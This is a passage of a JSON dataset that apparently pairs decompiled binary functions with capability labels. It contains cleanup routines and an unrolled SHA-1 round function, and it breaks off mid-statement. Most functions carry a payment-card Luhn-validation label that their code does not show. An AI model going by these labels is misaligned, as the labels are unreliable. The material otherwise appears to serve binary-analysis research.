        "decompiled_code": "\nvoid __fastcall fcn.00403fba(uint *param_1)\n\n{\n    *param_1 = 0x4177e8;\n    param_1[1] = 0x4177f0;\n    if (param_1[2] != 0) {\n        fcn.00406034();\n    }\n    param_1[2] = 0;\n    return;\n}\n",
        "token_count": 87
    },
    "00404637": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404637(uint arg_8h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint32_t arg_ch;\n    uchar auStack68 [36];\n    uint uStack32;\n    uint uStack28;\n    uchar auStack24 [16];\n    \n    uStack32 = 3;\n    arg_ch = 0;\n    uStack28 = 0;\n    auStack24 = ZEXT816(0);\n    if (*(in_ECX + 0xc) != 0) {\n        do {\n            puVar1 = fcn.00401787(auStack68, arg_ch);\n            fcn.00403852(*puVar1);\n            fcn.00401468();\n            iVar2 = fcn.00401787(auStack68, arg_ch);\n            fcn.00403873(iVar2 + 4);\n            fcn.00401468();\n            iVar2 = fcn.00401787(auStack68, arg_ch);\n            fcn.00403873(iVar2 + 8);\n            fcn.00401468();\n            arg_ch = arg_ch + 1;\n        } while (arg_ch < *(in_ECX + 0xc));\n    }\n    fcn.0040378b(arg_8h);\n    fcn.00403777();\n    return arg_8h;\n}\n",
        "token_count": 304
    },
    "004046f1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004046f1(uint *param_1)\n\n{\n    int32_t iVar1;\n    \n    *param_1 = 0x417848;\n    if (param_1[1] != 0) {\n        for (iVar1 = *(param_1[1] + -4); iVar1 != 0; iVar1 = iVar1 + -1) {\n            fcn.00401468();\n        }\n    }\n    param_1[1] = 0;\n    param_1[3] = 0;\n    param_1[2] = 0;\n    return;\n}\n",
        "token_count": 134
    },
    "0040472d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040472d(int32_t arg_8h)\n\n{\n    uint *in_ECX;\n    int32_t iVar1;\n    \n    *in_ECX = 0x417848;\n    fcn.0040136c(&arg_8h);\n    if (arg_8h != 0) {\n        for (iVar1 = *(arg_8h + -4); iVar1 != 0; iVar1 = iVar1 + -1) {\n            fcn.00401468();\n        }\n    }\n    return;\n}\n",
        "token_count": 120
    },
    "00404afb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nuint __cdecl fcn.00404afb(uint arg_8h)\n\n{\n    int32_t in_ECX;\n    int32_t arg_8h_00;\n    uint uVar1;\n    uint uVar2;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    uVar1 = *(in_ECX + 8);\n    arg_8h_00 = in_ECX + 4;\n    uVar2 = arg_8h;\n    fcn.00403873(arg_8h_00);\n    fcn.00403852(arg_8h_00);\n    fcn.0040378b(arg_8h_00);\n    fcn.00403777(arg_8h_00, uVar1, uVar2, 0xf, 0, ZEXT816(0));\n    return arg_8h;\n}\n",
        "token_count": 242
    },
    "00405f8c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00405f8c(int32_t param_1, uint32_t param_2)\n\n{\n    uint32_t arg_8h;\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = 0;\n    arg_8h = 0;\n    if (param_1 != 0) {\n        arg_8h = fcn.00405f48();\n    }\n    if (param_2 != 0) {\n        iVar1 = fcn.00405ffa();\n        if (param_1 == 0) {\n            return iVar1;\n        }\n        if ((iVar1 != 0) && (arg_8h != 0)) {\n            if (param_2 < arg_8h) {\n                arg_8h = param_2;\n            }\n            fcn.00406056(arg_8h);\n        }\n    }\n    if (param_1 != 0) {\n        fcn.00405feb();\n    }\n    return iVar1;\n}\n",
        "token_count": 224
    },
    "004063dd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "hash data using SHA1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004063dd(uint32_t *param_1, uint param_2)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    uint32_t uVar13;\n    uint32_t uVar14;\n    uint32_t uVar15;\n    uint32_t uVar16;\n    uint32_t uVar17;\n    uint32_t uVar18;\n    uint32_t uVar19;\n    uint32_t uVar20;\n    uint32_t uVar21;\n    uint32_t uVar22;\n    uint32_t uVar23;\n    uint32_t uVar24;\n    uint32_t uVar25;\n    uint32_t var_9ch;\n    uint32_t var_98h;\n    uint32_t var_94h;\n    uint32_t var_90h;\n    uint32_t var_8ch;\n    uint32_t var_88h;\n    uint32_t var_84h;\n    uint32_t var_80h;\n    uint32_t var_7ch;\n    uint32_t var_78h;\n    uint32_t var_74h;\n    uint32_t var_70h;\n    uint32_t var_6ch;\n    uint32_t var_68h;\n    uint32_t var_64h;\n    uint32_t var_60h;\n    uint32_t *var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_5ch = param_1;\n    fcn.0040102c(&var_9ch, param_2, 0x40);\n    uVar13 = *param_1;\n    uVar8 = param_1[1];\n    uVar7 = var_9ch >> 8 & 0xff00ff00 | var_9ch << 0x18 | (var_9ch & 0xff00) << 8 | var_9ch >> 0x18;\n    uVar3 = uVar8 >> 2 | uVar8 << 0x1e;\n    uVar8 = uVar7 + 0x5a827999 +\n            ((var_5ch[3] ^ var_5ch[2]) & uVar8 ^ var_5ch[3]) + (uVar13 << 5 | uVar13 >> 0x1b) + param_1[4];\n    uVar12 = var_98h >> 8 & 0xff00ff00 | var_98h << 0x18 | (var_98h & 0xff00) << 8 | var_98h >> 0x18;\n    uVar18 = uVar13 >> 2 | uVar13 << 0x1e;\n    uVar13 = var_5ch[3] + 0x5a827999 +\n             ((var_5ch[2] ^ uVar3) & uVar13 ^ var_5ch[2]) + (uVar8 * 0x20 | uVar8 >> 0x1b) + uVar12;\n    uVar1 = var_94h >> 8 & 0xff00ff00 | var_94h << 0x18 | (var_94h & 0xff00) << 8 | var_94h >> 0x18;\n    uVar19 = var_5ch[2] + 0x5a827999 + ((uVar3 ^ uVar18) & uVar8 ^ uVar3) + (uVar13 * 0x20 | uVar13 >> 0x1b) + uVar1;\n    uVar8 = uVar8 >> 2 | uVar8 * 0x40000000;\n    uVar2 = var_90h >> 8 & 0xff00ff00 | var_90h << 0x18 | (var_90h & 0xff00) << 8 | var_90h >> 0x18;\n    uVar14 = uVar13 >> 2 | uVar13 * 0x40000000;\n    uVar13 = uVar3 + 0x5a827999 + ((uVar8 ^ uVar18) & uVar13 ^ uVar18) + (uVar19 * 0x20 | uVar19 >> 0x1b) + uVar2;\n    uVar3 = var_8ch >> 8 & 0xff00ff00 | var_8ch << 0x18 | (var_8ch & 0xff00) << 8 | var_8ch >> 0x18;\n    uVar20 = uVar19 >> 2 | uVar19 * 0x40000000;\n    uVar19 = (uVar8 ^ (uVar8 ^ uVar14) & uVar19) + (uVar13 * 0x20 | uVar13 >> 0x1b) + uVar3 + uVar18 + 0x5a827999;\n    uVar18 = var_88h >> 8 & 0xff00ff00 | var_88h << 0x18 | (var_88h & 0xff00) << 8 | var_88h >> 0x18;\n    uVar4 = uVar13 >> 2 | uVar13 * 0x40000000;\n    uVar8 = uVar8 + 0x5a827999 + ((uVar14 ^ uVar20) & uVar13 ^ uVar14) + (uVar19 * 0x20 | uVar19 >> 0x1b) + uVar18;\n    uVar13 = var_84h >> 8 & 0xff00ff00 | var_84h << 0x18 | (var_84h & 0xff00) << 8 | var_84h >> 0x18;\n    uVar9 = uVar19 >> 2 | uVar19 * 0x40000000;\n    uVar19 = (uVar8 * 0x20 | uVar8 >> 0x1b) + uVar13 + ((uVar20 ^ uVar4) & uVar19 ^ uVar20) + uVar14 + 0x5a827999;\n    uVar15 = var_80h >> 8 & 0xff00ff00 | var_80h << 0x18 | (var_80h & 0xff00) << 8 | var_80h >> 0x18;\n    uVar16 = uVar8 >> 2 | uVar8 * 0x40000000;\n    uVar8 = (uVar19 * 0x20 | uVar19 >> 0x1b) + uVar15 + ((uVar4 ^ uVar9) & uVar8 ^ uVar4) + uVar20 + 0x5a827999;\n    uVar21 = var_7ch >> 8 & 0xff00ff00 | var_7ch << 0x18 | (var_7ch & 0xff00) << 8 | var_7ch >> 0x18;\n    uVar22 = uVar19 >> 2 | uVar19 * 0x40000000;\n    uVar19 = (uVar8 * 0x20 | uVar8 >> 0x1b) + uVar21 + ((uVar16 ^ uVar9) & uVar19 ^ uVar9) + uVar4 + 0x5a827999;\n    uVar5 = var_78h >> 8 & 0xff00ff00 | var_78h << 0x18 | (var_78h & 0xff00) << 8 | var_78h >> 0x18;\n    uVar14 = uVar8 >> 2 | uVar8 * 0x40000000;\n    uVar4 = (uVar19 * 0x20 | uVar19 >> 0x1b) + uVar5 + ((uVar16 ^ uVar22) & uVar8 ^ uVar16) + uVar9 + 0x5a827999;\n    uVar10 = var_74h >> 8 & 0xff00ff00 | var_74h << 0x18 | (var_74h & 0xff00) << 8 | var_74h >> 0x18;\n    uVar20 = uVar19 >> 2 | uVar19 * 0x40000000;\n    uVar16 = uVar16 + 0x5a827999 + ((uVar22 ^ uVar14) & uVar19 ^ uVar22) + (uVar4 * 0x20 | uVar4 >> 0x1b) + uVar10;\n    uVar8 = uVar16 >> 2 | uVar16 * 0x40000000;\n    uVar19 = var_70h >> 8 & 0xff00ff00 | var_70h << 0x18 | (var_70h & 0xff00) << 8 | var_70h >> 0x18;\n    uVar9 = (uVar14 ^ (uVar14 ^ uVar20) & uVar4) + (uVar16 * 0x20 | uVar16 >> 0x1b) + uVar19 + uVar22 + 0x5a827999;\n    uVar22 = uVar4 >> 2 | uVar4 * 0x40000000;\n    uVar4 = var_6ch >> 8 & 0xff00ff00 | var_6ch << 0x18 | (var_6ch & 0xff00) << 8 | var_6ch >> 0x18;\n    uVar16 = (uVar16 & (uVar20 ^ uVar22) ^ uVar20) + (uVar9 * 0x20 | uVar9 >> 0x1b) + uVar4 + uVar14 + 0x5a827999;\n    uVar14 = var_68h >> 8 & 0xff00ff00 | var_68h << 0x18 | (var_68h & 0xff00) << 8 | var_68h >> 0x18;\n    uVar6 = uVar9 >> 2 | uVar9 * 0x40000000;\n    uVar23 = (uVar22 ^ (uVar8 ^ uVar22) & uVar9) + (uVar16 * 0x20 | uVar16 >> 0x1b) + uVar14 + uVar20 + 0x5a827999;\n    uVar9 = var_64h >> 8 & 0xff00ff00 | var_64h << 0x18 | (var_64h & 0xff00) << 8 | var_64h >> 0x18;\n    uVar17 = uVar16 >> 2 | uVar16 * 0x40000000;\n    uVar11 = (uVar8 ^ (uVar8 ^ uVar6) & uVar16) + (uVar23 * 0x20 | uVar23 >> 0x1b) + uVar9 + uVar22 + 0x5a827999;\n    uVar20 = var_60h >> 8 & 0xff00ff00 | var_60h << 0x18 | (var_60h & 0xff00) << 8 | var_60h >> 0x18;\n    uVar7 = uVar14 ^ uVar21 ^ uVar1 ^ uVar7;\n    uVar16 = uVar7 << 1 | uVar7 < 0;\n    uVar8 = (uVar6 ^ (uVar6 ^ uVar17) & uVar23) + (uVar11 * 0x20 | uVar11 >> 0x1b) + uVar20 + uVar8 + 0x5a827999;\n    uVar24 = uVar23 >> 2 | uVar23 * 0x40000000;\n    uVar12 = uVar9 ^ uVar5 ^ uVar2 ^ uVar12;\n    uVar22 = uVar12 << 1 | uVar12 < 0;\n    uVar7 = (uVar17 ^ (uVar17 ^ uVar24) & uVar11) + (uVar8 * 0x20 | uVar8 >> 0x1b) + uVar16 + uVar6 + 0x5a827999;\n    uVar12 = uVar11 >> 2 | uVar11 * 0x40000000;\n    uVar1 = uVar20 ^ uVar10 ^ uVar3 ^ uVar1;\n    uVar6 = uVar1 << 1 | uVar1 < 0;\n    uVar17 = (uVar24 ^ (uVar24 ^ uVar12) & uVar8) + (uVar7 * 0x20 | uVar7 >> 0x1b) + uVar22 + uVar17 + 0x5a827999;\n    uVar1 = uVar8 >> 2 | uVar8 * 0x40000000;\n    uVar23 = uVar7 >> 2 | uVar7 * 0x40000000;\n    uVar8 = uVar19 ^ uVar18 ^ uVar2 ^ uVar16;\n    uVar11 = (uVar12 ^ (uVar1 ^ uVar12) & uVar7) + (uVar17 * 0x20 | uVar17 >> 0x1b) + uVar6 + uVar24 + 0x5a827999;\n    uVar8 = uVar8 << 1 | uVar8 < 0;\n    uVar24 = uVar17 >> 2 | uVar17 * 0x40000000;\n    uVar7 = uVar4 ^ uVar13 ^ uVar3 ^ uVar22;\n    uVar7 = uVar7 << 1 | uVar7 < 0;\n    uVar2 = (uVar1 ^ (uVar1 ^ uVar23) & uVar17) + (uVar11 * 0x20 | uVar11 >> 0x1b) + uVar8 + uVar12 + 0x5a827999;\n    uVar17 = uVar11 >> 2 | uVar11 * 0x40000000;\n    uVar12 = uVar14 ^ uVar15 ^ uVar18 ^ uVar6;\n    uVar12 = uVar12 << 1 | uVar12 < 0;\n    uVar18 = (uVar23 ^ uVar24 ^ uVar11) + (uVar2 * 0x20 | uVar2 >> 0x1b) + uVar7 + uVar1 + 0x6ed9eba1;\n    uVar3 = uVar2 >> 2 | uVar2 * 0x40000000;\n    uVar13 = uVar9 ^ uVar21 ^ uVar13 ^ uVar8;\n    uVar13 = uVar13 << 1 | uVar13 < 0;\n    uVar2 = (uVar24 ^ uVar17 ^ uVar2) + (uVar18 * 0x20 | uVar18 >> 0x1b) + uVar12 + uVar23 + 0x6ed9eba1;\n    uVar23 = uVar18 >> 2 | uVar18 * 0x40000000;\n    uVar1 = uVar20 ^ uVar5 ^ uVar15 ^ uVar7;\n    uVar1 = uVar1 << 1 | uVar1 < 0;\n    uVar11 = (uVar17 ^ uVar18 ^ uVar3) + (uVar2 * 0x20 | uVar2 >> 0x1b) + uVar13 + uVar24 + 0x6ed9eba1;\n    uVar18 = uVar17 + 0x6ed9eba1 + (uVar23 ^ uVar2 ^ uVar3) + (uVar11 * 0x20 | uVar11 >> 0x1b) + uVar1;\n    uVar24 = uVar2 >> 2 | uVar2 * 0x40000000;\n    uVar2 = uVar10 ^ uVar21 ^ uVar12 ^ uVar16;\n    uVar2 = uVar2 << 1 | uVar2 < 0;\n    uVar15 = uVar11 >> 2 | uVar11 * 0x40000000;\n    uVar11 = (uVar18 * 0x20 | uVar18 >> 0x1b) + uVar2 + (uVar23 ^ uVar24 ^ uVar11) + uVar3 + 0x6ed9eba1;\n    uVar3 = uVar19 ^ uVar5 ^ uVar13 ^ uVar22;\n    uVar3 = uVar3 << 1 | uVar3 < 0;\n    uVar17 = uVar18 >> 2 | uVar18 * 0x40000000;\n    uVar5 = (uVar11 * 0x20 | uVar11 >> 0x1b) + uVar3 + (uVar24 ^ uVar15 ^ uVar18) + uVar23 + 0x6ed9eba1;\n    uVar18 = uVar4 ^ uVar10 ^ uVar1 ^ uVar6;\n    uVar18 = uVar18 << 1 | uVar18 < 0;\n    uVar23 = uVar11 >> 2 | uVar11 * 0x40000000;\n    uVar11 = (uVar5 * 0x20 | uVar5 >> 0x1b) + uVar18 + (uVar15 ^ uVar17 ^ uVar11) + uVar24 + 0x6ed9eba1;\n    uVar19 = uVar14 ^ uVar19 ^ uVar2 ^ uVar8;\n    uVar19 = uVar19 << 1 | uVar19 < 0;\n    uVar21 = uVar5 >> 2 | uVar5 * 0x40000000;\n    uVar5 = (uVar11 * 0x20 | uVar11 >> 0x1b) + uVar19 + (uVar5 ^ uVar17 ^ uVar23) + uVar15 + 0x6ed9eba1;\n    uVar4 = uVar9 ^ uVar4 ^ uVar3 ^ uVar7;\n    uVar4 = uVar4 << 1 | uVar4 < 0;\n    uVar17 = (uVar5 * 0x20 | uVar5 >> 0x1b) + uVar4 + (uVar21 ^ uVar11 ^ uVar23) + uVar17 + 0x6ed9eba1;\n    uVar14 = uVar20 ^ uVar14 ^ uVar18 ^ uVar12;\n    uVar14 = uVar14 << 1 | uVar14 < 0;\n    uVar15 = uVar11 >> 2 | uVar11 * 0x40000000;\n    uVar10 = uVar5 >> 2 | uVar5 * 0x40000000;\n    uVar11 = (uVar17 * 0x20 | uVar17 >> 0x1b) + uVar14 + (uVar21 ^ uVar15 ^ uVar5) + uVar23 + 0x6ed9eba1;\n    uVar9 = uVar9 ^ uVar19 ^ uVar13 ^ uVar16;\n    uVar9 = uVar9 << 1 | uVar9 < 0;\n    uVar23 = uVar17 >> 2 | uVar17 * 0x40000000;\n    uVar5 = (uVar11 * 0x20 | uVar11 >> 0x1b) + uVar9 + (uVar15 ^ uVar10 ^ uVar17) + uVar21 + 0x6ed9eba1;\n    uVar20 = uVar20 ^ uVar4 ^ uVar1 ^ uVar22;\n    uVar20 = uVar20 << 1 | uVar20 < 0;\n    uVar21 = uVar11 >> 2 | uVar11 * 0x40000000;\n    uVar11 = (uVar5 * 0x20 | uVar5 >> 0x1b) + uVar20 + (uVar10 ^ uVar23 ^ uVar11) + uVar15 + 0x6ed9eba1;\n    uVar16 = uVar14 ^ uVar2 ^ uVar6 ^ uVar16;\n    uVar16 = uVar16 << 1 | uVar16 < 0;\n    uVar17 = uVar5 >> 2 | uVar5 * 0x40000000;\n    uVar5 = (uVar11 * 0x20 | uVar11 >> 0x1b) + uVar16 + (uVar5 ^ uVar23 ^ uVar21) + uVar10 + 0x6ed9eba1;\n    uVar22 = uVar9 ^ uVar3 ^ uVar8 ^ uVar22;\n    uVar22 = uVar22 << 1 | uVar22 < 0;\n    uVar10 = uVar11 >> 2 | uVar11 * 0x40000000;\n    uVar11 = (uVar5 * 0x20 | uVar5 >> 0x1b) + uVar22 + (uVar17 ^ uVar11 ^ uVar21) + uVar23 + 0x6ed9eba1;\n    uVar6 = uVar20 ^ uVar18 ^ uVar7 ^ uVar6;\n    uVar6 = uVar6 << 1 | uVar6 < 0;\n    uVar23 = uVar5 >> 2 | uVar5 * 0x40000000;\n    uVar5 = (uVar11 * 0x20 | uVar11 >> 0x1b) + uVar6 + (uVar17 ^ uVar10 ^ uVar5) + uVar21 + 0x6ed9eba1;\n    uVar8 = uVar19 ^ uVar12 ^ uVar8 ^ uVar16;\n    uVar8 = uVar8 << 1 | uVar8 < 0;\n    uVar24 = uVar11 >> 2 | uVar11 * 0x40000000;\n    uVar11 = (uVar10 ^ uVar23 ^ uVar11) + (uVar5 * 0x20 | uVar5 >> 0x1b) + uVar8 + uVar17 + 0x6ed9eba1;\n    uVar7 = uVar4 ^ uVar13 ^ uVar7 ^ uVar22;\n    uVar17 = uVar7 << 1 | uVar7 < 0;\n    uVar15 = uVar5 >> 2 | uVar5 * 0x40000000;\n    uVar5 = (uVar11 * 0x20 | uVar11 >> 0x1b) + uVar17 + (uVar23 ^ uVar24 ^ uVar5) + uVar10 + 0x6ed9eba1;\n    uVar7 = uVar14 ^ uVar1 ^ uVar12 ^ uVar6;\n    uVar7 = uVar7 << 1 | uVar7 < 0;\n    uVar10 = uVar11 >> 2 | uVar11 * 0x40000000;\n    uVar11 = (uVar5 * 0x20 | uVar5 >> 0x1b) + uVar7 + (uVar11 ^ uVar24 ^ uVar15) + uVar23 + 0x6ed9eba1;\n    uVar13 = uVar9 ^ uVar2 ^ uVar13 ^ uVar8;\n    uVar13 = uVar13 << 1 | uVar13 < 0;\n    uVar21 = uVar5 >> 2 | uVar5 * 0x40000000;\n    uVar5 = (uVar11 * 0x20 | uVar11 >> 0x1b) + uVar13 + (uVar10 ^ uVar5 ^ uVar15) + uVar24 + 0x6ed9eba1;\n    uVar12 = uVar20 ^ uVar3 ^ uVar1 ^ uVar17;\n    uVar12 = uVar12 << 1 | uVar12 < 0;\n    uVar24 = uVar11 >> 2 | uVar11 * 0x40000000;\n    uVar15 = (uVar10 ^ uVar21 ^ uVar11) + (uVar5 * 0x20 | uVar5 >> 0x1b) + uVar12 + uVar15 + 0x6ed9eba1;\n    uVar1 = uVar18 ^ uVar2 ^ uVar7 ^ uVar16;\n    uVar11 = uVar1 << 1 | uVar1 < 0;\n    uVar23 = uVar5 >> 2 | uVar5 * 0x40000000;\n    uVar1 = (uVar15 * 0x20 | uVar15 >> 0x1b) + 0x8f1bbcdc +\n            ((uVar24 | uVar5) & uVar21 | uVar24 & uVar5) + uVar11 + uVar10;\n    uVar2 = uVar19 ^ uVar3 ^ uVar13 ^ uVar22;\n    uVar5 = uVar2 << 1 | uVar2 < 0;\n    uVar2 = (uVar1 * 0x20 | uVar1 >> 0x1b) + 0x8f1bbcdc +\n            ((uVar23 | uVar15) & uVar24 | uVar23 & uVar15) + uVar5 + uVar21;\n    uVar3 = uVar4 ^ uVar18 ^ uVar12 ^ uVar6;\n    uVar10 = uVar3 << 1 | uVar3 < 0;\n    uVar18 = uVar15 >> 2 | uVar15 * 0x40000000;\n    uVar3 = uVar14 ^ uVar19 ^ uVar11 ^ uVar8;\n    uVar15 = uVar3 << 1 | uVar3 < 0;\n    uVar3 = (uVar1 & uVar18 | (uVar1 | uVar18) & uVar23) + uVar10 + uVar24 + 0x8f1bbcdc + (uVar2 * 0x20 | uVar2 >> 0x1b)\n    ;\n    uVar24 = uVar1 >> 2 | uVar1 * 0x40000000;\n    uVar1 = (uVar3 * 0x20 | uVar3 >> 0x1b) + 0x8f1bbcdc + ((uVar24 | uVar2) & uVar18 | uVar24 & uVar2) + uVar15 + uVar23\n    ;\n    uVar19 = uVar2 >> 2 | uVar2 * 0x40000000;\n    uVar2 = uVar9 ^ uVar4 ^ uVar5 ^ uVar17;\n    uVar23 = uVar2 << 1 | uVar2 < 0;\n    uVar2 = (uVar1 * 0x20 | uVar1 >> 0x1b) + 0x8f1bbcdc + ((uVar19 | uVar3) & uVar24 | uVar19 & uVar3) + uVar23 + uVar18\n    ;\n    uVar18 = uVar20 ^ uVar14 ^ uVar10 ^ uVar7;\n    uVar14 = uVar18 << 1 | uVar18 < 0;\n    uVar21 = uVar3 >> 2 | uVar3 * 0x40000000;\n    uVar25 = uVar1 >> 2 | uVar1 * 0x40000000;\n    uVar1 = (uVar2 * 0x20 | uVar2 >> 0x1b) + 0x8f1bbcdc + ((uVar21 | uVar1) & uVar19 | uVar21 & uVar1) + uVar14 + uVar24\n    ;\n    uVar3 = uVar9 ^ uVar15 ^ uVar13 ^ uVar16;\n    uVar9 = uVar3 << 1 | uVar3 < 0;\n    uVar3 = (uVar1 * 0x20 | uVar1 >> 0x1b) + 0x8f1bbcdc + ((uVar25 | uVar2) & uVar21 | uVar25 & uVar2) + uVar9 + uVar19;\n    uVar4 = uVar2 >> 2 | uVar2 * 0x40000000;\n    uVar2 = uVar20 ^ uVar23 ^ uVar12 ^ uVar22;\n    uVar20 = uVar2 << 1 | uVar2 < 0;\n    uVar16 = uVar14 ^ uVar11 ^ uVar6 ^ uVar16;\n    uVar18 = uVar16 << 1 | uVar16 < 0;\n    uVar2 = (uVar1 & uVar4 | (uVar1 | uVar4) & uVar25) + uVar20 + uVar21 + 0x8f1bbcdc + (uVar3 * 0x20 | uVar3 >> 0x1b);\n    uVar16 = uVar1 >> 2 | uVar1 * 0x40000000;\n    uVar1 = (uVar2 * 0x20 | uVar2 >> 0x1b) + 0x8f1bbcdc + ((uVar16 | uVar3) & uVar4 | uVar16 & uVar3) + uVar18 + uVar25;\n    uVar24 = uVar3 >> 2 | uVar3 * 0x40000000;\n    uVar22 = uVar9 ^ uVar5 ^ uVar8 ^ uVar22;\n    uVar19 = uVar22 << 1 | uVar22 < 0;\n    uVar3 = (uVar1 * 0x20 | uVar1 >> 0x1b) + 0x8f1bbcdc + ((uVar24 | uVar2) & uVar16 | uVar24 & uVar2) + uVar19 + uVar4;\n    uVar6 = uVar20 ^ uVar10 ^ uVar17 ^ uVar6;\n    uVar22 = uVar2 >> 2 | uVar2 * 0x40000000;\n    uVar4 = uVar6 << 1 | uVar6 < 0;\n    uVar21 = uVar1 >> 2 | uVar1 * 0x40000000;\n    uVar1 = (uVar3 * 0x20 | uVar3 >> 0x1b) + 0x8f1bbcdc + ((uVar22 | uVar1) & uVar24 | uVar22 & uVar1) + uVar4 + uVar16;\n    uVar8 = uVar15 ^ uVar7 ^ uVar8 ^ uVar18;\n    uVar16 = uVar8 << 1 | uVar8 < 0;\n    uVar8 = (uVar1 * 0x20 | uVar1 >> 0x1b) + 0x8f1bbcdc + ((uVar21 | uVar3) & uVar22 | uVar21 & uVar3) + uVar16 + uVar24\n    ;\n    uVar2 = uVar23 ^ uVar13 ^ uVar17 ^ uVar19;\n    uVar6 = uVar2 << 1 | uVar2 < 0;\n    uVar3 = uVar3 >> 2 | uVar3 * 0x40000000;\n    uVar7 = uVar14 ^ uVar12 ^ uVar7 ^ uVar4;\n    uVar17 = uVar7 << 1 | uVar7 < 0;\n    uVar7 = (uVar1 & uVar3 | (uVar1 | uVar3) & uVar21) + uVar6 + uVar22 + 0x8f1bbcdc + (uVar8 * 0x20 | uVar8 >> 0x1b);\n    uVar1 = uVar1 >> 2 | uVar1 * 0x40000000;\n    uVar2 = uVar8 >> 2 | uVar8 * 0x40000000;\n    uVar8 = (uVar7 * 0x20 | uVar7 >> 0x1b) + 0x8f1bbcdc + ((uVar1 | uVar8) & uVar3 | uVar1 & uVar8) + uVar17 + uVar21;\n    uVar13 = uVar9 ^ uVar11 ^ uVar13 ^ uVar16;\n    uVar21 = uVar13 << 1 | uVar13 < 0;\n    uVar22 = uVar7 >> 2 | uVar7 * 0x40000000;\n    uVar13 = (uVar8 * 0x20 | uVar8 >> 0x1b) + 0x8f1bbcdc + ((uVar2 | uVar7) & uVar1 | uVar2 & uVar7) + uVar21 + uVar3;\n    uVar7 = uVar20 ^ uVar5 ^ uVar12 ^ uVar6;\n    uVar24 = uVar7 << 1 | uVar7 < 0;\n    uVar7 = uVar8 >> 2 | uVar8 * 0x40000000;\n    uVar12 = (uVar13 * 0x20 | uVar13 >> 0x1b) + 0x8f1bbcdc +\n             ((uVar22 | uVar8) & uVar2 | uVar22 & uVar8) + uVar24 + uVar1;\n    uVar8 = uVar10 ^ uVar11 ^ uVar17 ^ uVar18;\n    uVar11 = uVar8 << 1 | uVar8 < 0;\n    uVar8 = uVar13 >> 2 | uVar13 * 0x40000000;\n    uVar1 = (uVar12 * 0x20 | uVar12 >> 0x1b) + 0x8f1bbcdc +\n            ((uVar7 | uVar13) & uVar22 | uVar7 & uVar13) + uVar11 + uVar2;\n    uVar13 = uVar15 ^ uVar5 ^ uVar21 ^ uVar19;\n    uVar5 = uVar13 << 1 | uVar13 < 0;\n    uVar2 = uVar12 >> 2 | uVar12 * 0x40000000;\n    uVar22 = (uVar1 * 0x20 | uVar1 >> 0x1b) + 0x8f1bbcdc + ((uVar12 | uVar8) & uVar7 | uVar12 & uVar8) + uVar5 + uVar22;\n    uVar13 = uVar23 ^ uVar10 ^ uVar24 ^ uVar4;\n    uVar13 = uVar13 << 1 | uVar13 < 0;\n    uVar12 = uVar14 ^ uVar15 ^ uVar11 ^ uVar16;\n    uVar12 = uVar12 << 1 | uVar12 < 0;\n    uVar15 = uVar1 >> 2 | uVar1 * 0x40000000;\n    uVar3 = (uVar22 * 0x20 | uVar22 >> 0x1b) + 0x8f1bbcdc + ((uVar2 | uVar1) & uVar8 | uVar2 & uVar1) + uVar13 + uVar7;\n    uVar7 = uVar9 ^ uVar23 ^ uVar5 ^ uVar6;\n    uVar7 = uVar7 << 1 | uVar7 < 0;\n    uVar1 = (uVar3 * 0x20 | uVar3 >> 0x1b) + ((uVar15 | uVar22) & uVar2 | uVar15 & uVar22) + 0x8f1bbcdc + uVar12 + uVar8\n    ;\n    uVar23 = uVar22 >> 2 | uVar22 * 0x40000000;\n    uVar10 = uVar3 >> 2 | uVar3 * 0x40000000;\n    uVar2 = (uVar1 * 0x20 | uVar1 >> 0x1b) + 0xca62c1d6 + (uVar15 ^ uVar23 ^ uVar3) + uVar7 + uVar2;\n    uVar8 = uVar20 ^ uVar14 ^ uVar13 ^ uVar17;\n    uVar8 = uVar8 << 1 | uVar8 < 0;\n    uVar22 = uVar1 >> 2 | uVar1 * 0x40000000;\n    uVar3 = (uVar2 * 0x20 | uVar2 >> 0x1b) + 0xca62c1d6 + (uVar23 ^ uVar10 ^ uVar1) + uVar8 + uVar15;\n    uVar1 = uVar9 ^ uVar12 ^ uVar21 ^ uVar18;\n    uVar1 = uVar1 << 1 | uVar1 < 0;\n    uVar9 = (uVar3 * 0x20 | uVar3 >> 0x1b) + 0xca62c1d6 + (uVar2 ^ uVar10 ^ uVar22) + uVar1 + uVar23;\n    uVar15 = uVar2 >> 2 | uVar2 * 0x40000000;\n    uVar2 = uVar20 ^ uVar7 ^ uVar24 ^ uVar19;\n    uVar2 = uVar2 << 1 | uVar2 < 0;\n    uVar25 = uVar3 >> 2 | uVar3 * 0x40000000;\n    uVar14 